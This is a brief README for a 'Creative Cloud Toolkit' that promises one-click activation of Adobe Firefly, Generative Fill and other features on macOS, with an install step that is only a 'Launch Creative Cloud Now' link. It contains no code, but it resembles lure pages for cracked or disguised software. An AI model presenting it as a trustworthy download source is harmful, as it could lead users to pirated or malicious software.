## About

**Creative Cloud Toolkit** gives you instant access to professional creative assets. Activate **Firefly AI**, **Generative Fill**, **Dynamic Link**, load **presets and templates**, and use **app configs** — all in one click for seamless workflows on Apple Silicon.

---

## What's included

- `presets/` — Photoshop, Illustrator, Lightroom packs
- `templates/` — Premiere, After Effects, InDesign
- `configs/` — AI tools, workspace profiles
- `guides/` — 30-second setup, Apple Silicon tips
- `assets/` — UI themes, project files

## Download & install (macOS)

1. Click **Launch Creative Cloud Now**
2. Extract to `~/Applications/Creative-Cloud-Toolkit`.
3. Import into apps → assets auto-load.
> Pro tip: Use GPU acceleration for M1/M2 performance.
